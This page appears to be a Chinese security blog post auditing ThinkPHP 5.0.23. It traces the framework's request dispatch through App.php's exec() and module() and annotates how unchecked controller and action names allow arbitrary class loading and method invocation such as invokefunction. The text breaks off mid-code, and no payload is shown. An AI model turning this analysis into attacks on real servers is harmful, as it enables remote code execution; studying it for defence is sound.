<!DOCTYPE html>

<html theme="dark" showBanner="true" hasBanner="true" > 
<head>
  <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
  <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
  <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
  <script src="/js/color.global.min.js" ></script>
  <script src="/js/load-settings.js" ></script>
  <head>
  <meta charset="utf-8">
  
  
  

  
  <title>ThinkPHP_5.0.23 | Licivo&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="目录结构123456789101112131415161718192021222324252627282930313233343536373839404142434445www  WEB部署目录（或者子目录）├─application           应用目录│  ├─common             公共模块目录（可以更改）│  ├─module_name        模块目录│  │">
<meta property="og:type" content="article">
<meta property="og:title" content="ThinkPHP_5.0.23">
<meta property="og:url" content="http://example.com/2026/01/21/ThinkPHP_5.0.23/index.html">
<meta property="og:site_name" content="Licivo&#39;s Blog">
<meta property="og:description" content="目录结构123456789101112131415161718192021222324252627282930313233343536373839404142434445www  WEB部署目录（或者子目录）├─application           应用目录│  ├─common             公共模块目录（可以更改）│  ├─module_name        模块目录│  │">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260122135449.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260122135513.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260122135555.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260126165300.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260127084936.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260127085506.png">
<meta property="og:image" content="http://example.com/images/a6349c3614a0bf20b2bfd9b9ddc40393.png">
<meta property="og:image" content="http://example.com/images/2d3d889f1ad4e3bafbf19dd3f3e8326b.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260127102713.png">
<meta property="og:image" content="http://example.com/images/Pasted%20image%2020260127150016.png">
<meta property="article:published_time" content="2026-01-21T08:48:17.697Z">
<meta property="article:modified_time" content="2026-02-03T08:30:04.552Z">
<meta property="article:author" content="Licivo">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020260122135449.png">
  
    <link rel="alternate" href="/atom.xml" title="Licivo's Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/avatar.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 8.1.1"></head>

</head>
<body>
  
  
    
<div id="banner" class="">
  <img src="/images/banner1.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  
  <div id="main-grid" class="">
    <div id="nav" class="">
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/" style="display: flex; align-items: center; height: 100%; padding-left: 15px;">
      <img src="/images/avatar.png" 
           style="width: 32px; height: 32px; border-radius: 50%; object-fit: cover; border: 2px solid var(--color-primary); box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-right: 10px;">
      <span style="font-weight: bold; font-size: 1.15rem; letter-spacing: 0.5px;">
        Licivo's Blog
      </span>
    </a>
  </nav>
  
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>

  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>

    
      <a id="nav-search-btn" class="nav-icon" title="Search" style="cursor: pointer;">
        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 0 24 24" width="24px" fill="currentColor">
    <path d="M0 0h24v24H0V0z" fill="none"/>
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
</svg>

      </a>
    

    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS 订阅">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    

    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>

<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
    
      <a class="nav-dropdown-link" id="nav-mobile-search">Search</a>
    

    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS 订阅">RSS</a>
     
    </div>
</div>

<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
  // 在原有的 dropdownBtn 逻辑下方添加
let searchBtn = document.getElementById("nav-search-btn");
let searchForm = document.getElementById("search-form-wrap");
let searchClose = document.getElementById("search-close-btn");

if (searchBtn) {
  searchBtn.onclick = function() {
    searchForm.classList.remove("hidden");
    document.getElementById("search-input").focus(); // 自动聚焦输入框
  }
}

if (searchClose) {
  searchClose.onclick = function() {
    searchForm.classList.add("hidden");
  }
}

// 按下 ESC 键关闭搜索
document.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') searchForm.classList.add("hidden");
});
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Licivo </div>
      <div class="dot"></div>
      <div class="subtitle">8bysnm@gmail.com </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Licivo" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                Java 反序列化
                <div class="category-count">6</div>
            </a>
        
            <a class="category-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">
                WEB安全
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                 代码审计
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/categories/LLM%E5%AE%89%E5%85%A8/">
                LLM安全
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-ThinkPHP_5.0.23" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        ThinkPHP_5.0.23
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2026-01-21T08:48:17.697Z" itemprop="datePublished">2026-01-21</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"> 代码审计</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            23k 词 
          </div>

          
          <div class="need-seperator meta-info">
            <i class="fa-solid fa-fire-flame-curved" style="color: #ff5722; margin-right: 8px;"></i>
            <span id="busuanzi_container_page_pv" style="display: none;">
              <span id="busuanzi_value_page_pv"></span>
            </span>
          </div>
          
        </div>
        
      </header>

      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">www  WEB部署目录（或者子目录）</span><br><span class="line">├─application           应用目录</span><br><span class="line">│  ├─common             公共模块目录（可以更改）</span><br><span class="line">│  ├─module_name        模块目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录</span><br><span class="line">│  │  ├─view            视图目录</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─command.php        命令行工具配置文件</span><br><span class="line">│  ├─common.php         公共函数文件</span><br><span class="line">│  ├─config.php         公共配置文件</span><br><span class="line">│  ├─route.php          路由配置文件</span><br><span class="line">│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">│  └─database.php       数据库配置文件</span><br><span class="line">│</span><br><span class="line">├─public                WEB目录（对外访问目录）</span><br><span class="line">│  ├─index.php          入口文件</span><br><span class="line">│  ├─router.php         快速测试文件</span><br><span class="line">│  └─.htaccess          用于apache的重写</span><br><span class="line">│</span><br><span class="line">├─thinkphp              框架系统目录</span><br><span class="line">│  ├─lang               语言文件目录</span><br><span class="line">│  ├─library            框架类库目录</span><br><span class="line">│  │  ├─think           Think类库包目录</span><br><span class="line">│  │  └─traits          系统Trait目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─tpl                系统模板目录</span><br><span class="line">│  ├─base.php           基础定义文件</span><br><span class="line">│  ├─console.php        控制台入口文件</span><br><span class="line">│  ├─convention.php     框架惯例配置文件</span><br><span class="line">│  ├─helper.php         助手函数文件</span><br><span class="line">│  ├─phpunit.xml        phpunit配置文件</span><br><span class="line">│  └─start.php          框架入口文件</span><br><span class="line">│</span><br><span class="line">├─extend                扩展类库目录</span><br><span class="line">├─runtime               应用的运行时目录（可写，可定制）</span><br><span class="line">├─vendor                第三方类库目录（Composer依赖库）</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br></pre></td></tr></table></figure>

<h1 id="输入处理层审计"><a href="#输入处理层审计" class="headerlink" title="输入处理层审计"></a>输入处理层审计</h1><p>public&#x2F;index.php -&gt; thinkphp&#x2F;start.php -&gt; thinkphp&#x2F;library&#x2F;App.php</p>
<h2 id="App-php-核心调度"><a href="#App-php-核心调度" class="headerlink" title="App.php 核心调度"></a>App.php 核心调度</h2><p>在 App.php 中注意到存在一个函数 exec()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">exec</span>(<span class="variable">$dispatch</span>, <span class="variable">$config</span>);</span><br></pre></td></tr></table></figure>

<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>跟进 exec 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$dispatch</span>, <span class="variable">$config</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$dispatch</span>[<span class="string">&#x27;type&#x27;</span>]) &#123;  </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;redirect&#x27;</span>: <span class="comment">// 重定向跳转  </span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title class_">Response</span>::<span class="title function_ invoke__">create</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;url&#x27;</span>], <span class="string">&#x27;redirect&#x27;</span>)  </span><br><span class="line">                -&gt;<span class="title function_ invoke__">code</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;status&#x27;</span>]);  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;module&#x27;</span>: <span class="comment">// 模块/控制器/操作  </span></span><br><span class="line">            <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">module</span>(  </span><br><span class="line">                <span class="variable">$dispatch</span>[<span class="string">&#x27;module&#x27;</span>],  </span><br><span class="line">                <span class="variable">$config</span>,  </span><br><span class="line">                <span class="keyword">isset</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>]) ? <span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>] : <span class="literal">null</span>  </span><br><span class="line">            );  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;controller&#x27;</span>: <span class="comment">// 执行控制器操作  </span></span><br><span class="line">            <span class="variable">$vars</span> = <span class="title function_ invoke__">array_merge</span>(<span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">param</span>(), <span class="variable">$dispatch</span>[<span class="string">&#x27;var&#x27;</span>]);  </span><br><span class="line">            <span class="variable">$data</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">action</span>(  </span><br><span class="line">                <span class="variable">$dispatch</span>[<span class="string">&#x27;controller&#x27;</span>],  </span><br><span class="line">                <span class="variable">$vars</span>,  </span><br><span class="line">                <span class="variable">$config</span>[<span class="string">&#x27;url_controller_layer&#x27;</span>],  </span><br><span class="line">                <span class="variable">$config</span>[<span class="string">&#x27;controller_suffix&#x27;</span>]  </span><br><span class="line">            );  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;method&#x27;</span>: <span class="comment">// 回调方法  </span></span><br><span class="line">            <span class="variable">$vars</span> = <span class="title function_ invoke__">array_merge</span>(<span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">param</span>(), <span class="variable">$dispatch</span>[<span class="string">&#x27;var&#x27;</span>]);  </span><br><span class="line">            <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">invokeMethod</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;method&#x27;</span>], <span class="variable">$vars</span>);  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>: <span class="comment">// 闭包  </span></span><br><span class="line">            <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">invokeFunction</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;function&#x27;</span>]);  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;response&#x27;</span>: <span class="comment">// Response 实例  </span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$dispatch</span>[<span class="string">&#x27;response&#x27;</span>];  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">default</span>:  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\InvalidArgumentException</span>(<span class="string">&#x27;dispatch type not support&#x27;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码主要是针对 <code>$dispatch</code> 的类型来做判断，其中重点注意到这两个类型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;method&#x27;</span>: <span class="comment">// 回调方法  </span></span><br><span class="line">    <span class="variable">$vars</span> = <span class="title function_ invoke__">array_merge</span>(<span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">param</span>(), <span class="variable">$dispatch</span>[<span class="string">&#x27;var&#x27;</span>]);  </span><br><span class="line">    <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">invokeMethod</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;method&#x27;</span>], <span class="variable">$vars</span>);  </span><br><span class="line">    <span class="keyword">break</span>;  </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>: <span class="comment">// 闭包  </span></span><br><span class="line">    <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">invokeFunction</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;function&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;module&#x27;</span>: <span class="comment">// 模块/控制器/操作  </span></span><br><span class="line">            <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">module</span>(  </span><br><span class="line">                <span class="variable">$dispatch</span>[<span class="string">&#x27;module&#x27;</span>],  </span><br><span class="line">                <span class="variable">$config</span>,  </span><br><span class="line">                <span class="keyword">isset</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>]) ? <span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>] : <span class="literal">null</span>  </span><br><span class="line">            );  </span><br><span class="line">            <span class="keyword">break</span>;   </span><br></pre></td></tr></table></figure>


<h3 id="module"><a href="#module" class="headerlink" title="module()"></a>module()</h3><p>在 module()函数中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.使用 explode 进行分割模块</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$result</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.仅仅检查了第一个模块为 index</span><br><span class="line"></span><br><span class="line"><span class="variable">$module</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$result</span>[<span class="number">0</span>] ?: <span class="variable">$config</span>[<span class="string">&#x27;default_module&#x27;</span>]));</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$module</span>, <span class="variable">$config</span>[<span class="string">&#x27;deny_module_list&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_dir</span>(APP_PATH . <span class="variable">$module</span>)) &#123;</span><br><span class="line">    <span class="variable">$available</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.加载任意类</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取控制器名</span></span><br><span class="line"><span class="variable">$controller</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$result</span>[<span class="number">1</span>] ?: <span class="variable">$config</span>[<span class="string">&#x27;default_controller&#x27;</span>]);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 实例化控制器</span></span><br><span class="line"><span class="variable">$instance</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">controller</span>( //拿到控制器的名字去加载对应的类文件</span><br><span class="line">    <span class="variable">$controller</span>, // 这里传入了 <span class="string">&#x27;\think\app&#x27;</span></span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;url_controller_layer&#x27;</span>],</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;controller_suffix&#x27;</span>],</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;empty_controller&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>. 执行任意方法</span><br><span class="line"><span class="comment">// 获取操作名</span></span><br><span class="line"><span class="variable">$actionName</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$result</span>[<span class="number">2</span>] ?: <span class="variable">$config</span>[<span class="string">&#x27;default_action&#x27;</span>]);</span><br><span class="line"><span class="comment">// ... </span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$instance</span>, <span class="variable">$action</span>])) &#123; <span class="comment">//检查 instance 有没有 action方法</span></span><br><span class="line">	    <span class="variable">$call</span> = [<span class="variable">$instance</span>, <span class="variable">$action</span>]; <span class="comment">// 变成了 [\think\App, &#x27;invokefunction&#x27;]</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">invokeMethod</span>(<span class="variable">$call</span>, <span class="variable">$vars</span>);</span><br><span class="line">&#125;</span><br><span 